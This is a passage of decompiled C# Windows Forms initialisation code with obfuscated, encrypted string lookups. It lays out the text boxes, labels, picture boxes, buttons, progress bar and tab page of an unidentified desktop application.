		((Control)textBox36).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x13740A5D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76), 10f, (FontStyle)1);
		((Control)textBox36).Location = new Point(207, 493);
		((Control)textBox36).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A292D5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc);
		((Control)textBox36).Size = new Size(191, 23);
		((Control)textBox36).TabIndex = 128;
		((Control)textBox36).TextChanged += textBox36_TextChanged;
		((Control)textBox37).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1602055031 ^ -339771710 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782), 10f, (FontStyle)1);
		((Control)textBox37).Location = new Point(10, 493);
		((Control)textBox37).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C637A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970);
		((Control)textBox37).Size = new Size(191, 23);
		((Control)textBox37).TabIndex = 127;
		((Control)textBox37).TextChanged += textBox37_TextChanged;
		((Control)label61).AutoSize = true;
		((Control)label61).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BCBB04 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6), 10f, (FontStyle)1);
		((Control)label61).ForeColor = SystemColors.ControlLightLight;
		((Control)label61).Location = new Point(402, 473);
		((Control)label61).Margin = new Padding(5, 0, 5, 0);
		((Control)label61).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x13742973 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76);
		((Control)label61).Size = new Size(79, 16);
		((Control)label61).TabIndex = 126;
		((Control)label61).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875C095 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3);
		((Control)label62).AutoSize = true;
		((Control)label62).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5BBB4015 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e), 10f, (FontStyle)1);
		((Control)label62).ForeColor = SystemColors.ControlLightLight;
		((Control)label62).Location = new Point(202, 473);
		((Control)label62).Margin = new Padding(5, 0, 5, 0);
		((Control)label62).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DE523 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d);
		((Control)label62).Size = new Size(98, 16);
		((Control)label62).TabIndex = 125;
		((Control)label62).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x222B3636 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_4a30e34068e34f6f9ca741119ec24a63);
		((Control)label63).AutoSize = true;
		((Control)label63).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(--863542085 ^ 0x53F62279 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9), 10f, (FontStyle)1);
		((Control)label63).ForeColor = SystemColors.ControlLightLight;
		((Control)label63).Location = new Point(10, 473);
		((Control)label63).Margin = new Padding(5, 0, 5, 0);
		((Control)label63).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20C2B254 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8141a8b72aa44b3a664e8c4a2731290);
		((Control)label63).Size = new Size(82, 16);
		((Control)label63).TabIndex = 124;
		((Control)label63).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A5E0C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf);
		pictureBox13.BorderStyle = (BorderStyle)2;
		((Control)pictureBox13).Enabled = false;
		((Control)pictureBox13).Location = new Point(957, 55);
		((Control)pictureBox13).Margin = new Padding(0);
		((Control)pictureBox13).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54C12FB0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_79a180699bf54d4d83e647d26385348a);
		((Control)pictureBox13).Size = new Size(275, 356);
		pictureBox13.SizeMode = (PictureBoxSizeMode)4;
		pictureBox13.TabIndex = 123;
		pictureBox13.TabStop = false;
		((Control)pictureBox13).Click += pictureBox13_Click;
		pictureBox14.BorderStyle = (BorderStyle)2;
		((Control)pictureBox14).Enabled = false;
		((Control)pictureBox14).Location = new Point(762, 56);
		((Control)pictureBox14).Margin = new Padding(0);
		((Control)pictureBox14).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA13C02 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad);
		((Control)pictureBox14).Size = new Size(186, 322);
		pictureBox14.SizeMode = (PictureBoxSizeMode)4;
		pictureBox14.TabIndex = 122;
		pictureBox14.TabStop = false;
		((Control)pictureBox14).Click += pictureBox14_Click;
		pictureBox15.BorderStyle = (BorderStyle)2;
		((Control)pictureBox15).Enabled = false;
		((Control)pictureBox15).Location = new Point(561, 56);
		((Control)pictureBox15).Margin = new Padding(0);
		((Control)pictureBox15).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F72553A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165);
		((Control)pictureBox15).Size = new Size(186, 322);
		pictureBox15.SizeMode = (PictureBoxSizeMode)4;
		pictureBox15.TabIndex = 121;
		pictureBox15.TabStop = false;
		((Control)pictureBox15).Click += pictureBox15_Click;
		pictureBox16.BorderStyle = (BorderStyle)2;
		((Control)pictureBox16).Enabled = false;
		((Control)pictureBox16).Location = new Point(251, 229);
		((Control)pictureBox16).Margin = new Padding(0);
		((Control)pictureBox16).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD0465F8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_429d35516f59415f9df9c1fe0976e925);
		((Control)pictureBox16).Size = new Size(294, 148);
		pictureBox16.SizeMode = (PictureBoxSizeMode)4;
		pictureBox16.TabIndex = 120;
		pictureBox16.TabStop = false;
		((Control)pictureBox16).Click += pictureBox16_Click;
		((Control)button49).BackColor = Color.Green;
		((Control)button49).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA11E9E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad), 10f, (FontStyle)1);
		((Control)button49).ForeColor = SystemColors.ControlLightLight;
		((Control)button49).Location = new Point(10, 443);
		((Control)button49).Margin = new Padding(5, 3, 5, 3);
		((Control)button49).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2655AACE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2f12304c094c4981ae78cdfa1dc9cd9e);
		((Control)button49).Size = new Size(151, 23);
		((Control)button49).TabIndex = 119;
		((Control)button49).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12235B0A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b);
		((ButtonBase)button49).UseVisualStyleBackColor = false;
		((Control)button49).Click += button49_Click;
		((Control)button50).BackColor = Color.Green;
		((Control)button50).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C407E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button50).ForeColor = SystemColors.ControlLightLight;
		((Control)button50).Location = new Point(10, 39);
		((Control)button50).Margin = new Padding(5, 3, 5, 3);
		((Control)button50).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CDB66 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb);
		((Control)button50).Size = new Size(186, 38);
		((Control)button50).TabIndex = 118;
		((Control)button50).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA1038C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad);
		((ButtonBase)button50).UseVisualStyleBackColor = false;
		((Control)button50).Click += button50_Click;
		((Control)label64).AutoSize = true;
		((Control)label64).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EEF6A6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label64).ForeColor = SystemColors.ControlLightLight;
		((Control)label64).Location = new Point(10, 362);
		((Control)label64).Margin = new Padding(5, 0, 5, 0);
		((Control)label64).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x41E0D32B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a);
		((Control)label64).Size = new Size(89, 19);
		((Control)label64).TabIndex = 117;
		((Control)label64).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C5CAE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970);
		pictureBox17.BorderStyle = (BorderStyle)2;
		((Control)pictureBox17).Location = new Point(10, 384);
		((Control)pictureBox17).Margin = new Padding(5, 3, 5, 3);
		((Control)pictureBox17).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DC845 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782);
		((Control)pictureBox17).Size = new Size(236, 53);
		pictureBox17.SizeMode = (PictureBoxSizeMode)1;
		pictureBox17.TabIndex = 116;
		pictureBox17.TabStop = false;
		((Control)pictureBox17).Click += pictureBox17_Click;
		((Control)button51).BackColor = Color.FromArgb(64, 64, 64);
		((Control)button51).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8C502 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e), 10f, (FontStyle)1);
		((Control)button51).ForeColor = SystemColors.ControlLightLight;
		((Control)button51).Location = new Point(162, 443);
		((Control)button51).Margin = new Padding(5, 3, 5, 3);
		((Control)button51).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678F92AF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa);
		((Control)button51).Size = new Size(84, 23);
		((Control)button51).TabIndex = 115;
		((Control)button51).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5ADE70CC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d06723451b644b929e3ffec494e31c68);
		((ButtonBase)button51).UseVisualStyleBackColor = false;
		((Control)button51).Click += button51_Click;
		((Control)button52).BackColor = Color.MediumOrchid;
		((Control)button52).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5BBB4015 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button52).ForeColor = SystemColors.ControlLightLight;
		((Control)button52).Location = new Point(256, 428);
		((Control)button52).Margin = new Padding(5, 3, 5, 3);
		((Control)button52).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1602055031 ^ -2108147696 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed);
		((Control)button52).Size = new Size(115, 38);
		((Control)button52).TabIndex = 114;
		((Control)button52).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF23F8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a);
		((ButtonBase)button52).UseVisualStyleBackColor = false;
		((Control)button52).Click += button52_Click;
		((Control)button53).BackColor = Color.MediumOrchid;
		((Control)button53).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x60583C09 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button53).ForeColor = SystemColors.ControlLightLight;
		((Control)button53).Location = new Point(505, 428);
		((Control)button53).Margin = new Padding(5, 3, 5, 3);
		((Control)button53).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BCAE79 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a);
		((Control)button53).Size = new Size(115, 38);
		((Control)button53).TabIndex = 113;
		((Control)button53).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x694615B5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f);
		((ButtonBase)button53).UseVisualStyleBackColor = false;
		((Control)button53).Click += button53_Click;
		((Control)button54).BackColor = Color.FromArgb(0, 0, 64);
		((Control)button54).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x10ACB9DB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6ae29e5e756542b6a6630ad169e9dc76), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button54).ForeColor = SystemColors.ControlLightLight;
		((Control)button54).Location = new Point(955, 1);
		((Control)button54).Margin = new Padding(5, 3, 5, 3);
		((Control)button54).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A12CB5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc);
		((Control)button54).Size = new Size(150, 38);
		((Control)button54).TabIndex = 112;
		((Control)button54).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20C28C84 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8141a8b72aa44b3a664e8c4a2731290);
		((ButtonBase)button54).UseVisualStyleBackColor = false;
		((Control)button54).Click += button54_Click;
		pictureBox18.BorderStyle = (BorderStyle)2;
		((Control)pictureBox18).Location = new Point(14, 120);
		((Control)pictureBox18).Margin = new Padding(5, 3, 5, 3);
		((Control)pictureBox18).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20C2B57C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8141a8b72aa44b3a664e8c4a2731290);
		((Control)pictureBox18).Size = new Size(177, 239);
		pictureBox18.SizeMode = (PictureBoxSizeMode)1;
		pictureBox18.TabIndex = 105;
		pictureBox18.TabStop = false;
		((Control)pictureBox18).Click += pictureBox18_Click;
		((Control)button55).BackColor = Color.FromArgb(64, 64, 64);
		((Control)button55).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB3955 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f), 8f, (FontStyle)1);
		((Control)button55).ForeColor = SystemColors.ControlLightLight;
		((Control)button55).Location = new Point(136, 76);
		((Control)button55).Margin = new Padding(5, 3, 5, 3);
		((Control)button55).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EED320 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6);
		((Control)button55).Size = new Size(60, 38);
		((Control)button55).TabIndex = 104;
		((Control)button55).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x127114A2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2);
		((ButtonBase)button55).UseVisualStyleBackColor = false;
		((Control)button55).Click += button55_Click;
		pictureBox19.BorderStyle = (BorderStyle)2;
		((Control)pictureBox19).Enabled = false;
		((Control)pictureBox19).Location = new Point(251, 75);
		((Control)pictureBox19).Margin = new Padding(0);
		((Control)pictureBox19).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6CBC86 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823);
		((Control)pictureBox19).Size = new Size(294, 148);
		pictureBox19.SizeMode = (PictureBoxSizeMode)4;
		pictureBox19.TabIndex = 106;
		pictureBox19.TabStop = false;
		((Control)pictureBox19).Click += pictureBox19_Click;
		((Control)button56).BackColor = Color.Blue;
		((Control)button56).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x60583C09 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button56).ForeColor = SystemColors.ControlLightLight;
		((Control)button56).Location = new Point(281, 1);
		((Control)button56).Margin = new Padding(5, 3, 5, 3);
		((Control)button56).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608E9C6A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9);
		((Control)button56).Size = new Size(107, 38);
		((Control)button56).TabIndex = 107;
		((Control)button56).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1223598A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b);
		((ButtonBase)button56).UseVisualStyleBackColor = false;
		((Control)button56).Click += button56_Click;
		((Control)progressBar3).Location = new Point(256, 391);
		((Control)progressBar3).Margin = new Padding(5, 3, 5, 3);
		((Control)progressBar3).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9AC391 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549);
		((Control)progressBar3).Size = new Size(692, 18);
		((Control)progressBar3).TabIndex = 108;
		((Control)label65).AutoSize = true;
		((Control)label65).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A43EA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label65).ForeColor = SystemColors.ControlLightLight;
		((Control)label65).Location = new Point(10, 17);
		((Control)label65).Margin = new Padding(5, 0, 5, 0);
		((Control)label65).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x736E29C3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40);
		((Control)label65).Size = new Size(190, 19);
		((Control)label65).TabIndex = 111;
		((Control)label65).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B71888C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33);
		((Control)button57).BackColor = Color.Green;
		((Control)button57).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E9048F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button57).ForeColor = SystemColors.ControlLightLight;
		((Control)button57).Location = new Point(605, 1);
		((Control)button57).Margin = new Padding(5, 3, 5, 3);
		((Control)button57).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54046491 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d2a5bdc84a4644acb5d9fa871e9d89cc);
		((Control)button57).Size = new Size(110, 38);
		((Control)button57).TabIndex = 109;
		((Control)button57).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1F03CDCD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ba511a03f3884e04a1032f95e5af7ce7);
		((ButtonBase)button57).UseVisualStyleBackColor = false;
		((Control)button57).Click += button57_Click;
		((Control)tabPage5).BackColor = Color.FromArgb(16, 26, 40);
		((Control)tabPage5).Controls.Add((Control)(object)label39);
		((Control)tabPage5).Controls.Add((Control)(object)button60);
		((Control)tabPage5).Controls.Add((Control)(object)button67);
		((Control)tabPage5).Controls.Add((Control)(object)button71);
		((Control)tabPage5).Controls.Add((Control)(object)button72);
		((Control)tabPage5).Controls.Add((Control)(object)comboBox20);
		((Control)tabPage5).Controls.Add((Control)(object)textBox39);
		((Control)tabPage5).Controls.Add((Control)(object)label69);
		((Control)tabPage5).Controls.Add((Control)(object)textBox45);
		((Control)tabPage5).Controls.Add((Control)(object)label76);
		((Control)tabPage5).Controls.Add((Control)(object)label77);
		((Control)tabPage5).Controls.Add((Control)(object)textBox48);
		((Control)tabPage5).Controls.Add((Control)(object)label87);
		((Control)tabPage5).Controls.Add((Control)(object)textBox51);
		((Control)tabPage5).Controls.Add((Control)(object)textBox52);
		((Control)tabPage5).Controls.Add((Control)(object)textBox53);
		((Control)tabPage5).Controls.Add((Control)(object)label88);
		((Control)tabPage5).Controls.Add((Control)(object)label89);
		((Control)tabPage5).Controls.Add((Control)(object)label90);
		((Control)tabPage5).Controls.Add((Control)(object)pictureBox22);
		((Control)tabPage5).Controls.Add((Control)(object)button74);
		((Control)tabPage5).Controls.Add((Control)(object)label91);
		((Control)tabPage5).Controls.Add((Control)(object)pictureBox26);
		((Control)tabPage5).Controls.Add((Control)(object)button76);
		((Control)tabPage5).Controls.Add((Control)(object)button78);
		((Control)tabPage5).Controls.Add((Control)(object)button81);
		((Control)tabPage5).Controls.Add((Control)(object)progressBar4);
		tabPage5.Location = new Point(4, 54);
		((Control)tabPage5).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x736E29A5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40);
		((Control)tabPage5).Padding = new Padding(3);
		((Control)tabPage5).Size = new Size(1251, 705);
		tabPage5.TabIndex = 5;
		((Control)tabPage5).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F725296 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165);
		((Control)label39).AutoSize = true;
		((Control)label39).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DEA4B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782), 10f, (FontStyle)1);
		((Control)label39).ForeColor = SystemColors.ControlLightLight;
		((Control)label39).Location = new Point(218, 136);
		((Control)label39).Margin = new Padding(5, 0, 5, 0);
		((Control)label39).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12712FA2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2);
		((Control)label39).Size = new Size(80, 16);
		((Control)label39).TabIndex = 193;
		((Control)label39).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DC0BB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d);
		((Control)button60).BackColor = Color.Teal;
		((Control)button60).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608EB93C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button60).ForeColor = SystemColors.ControlLightLight;
		((Control)button60).Location = new Point(1018, 8);
		((Control)button60).Margin = new Padding(5, 3, 5, 3);
		((Control)button60).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54C129B4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_79a180699bf54d4d83e647d26385348a);
		((Control)button60).Size = new Size(107, 38);
		((Control)button60).TabIndex = 190;
		((Control)button60).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2319F328 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8af4c72c2bf24df2961c47634b9fc94e);
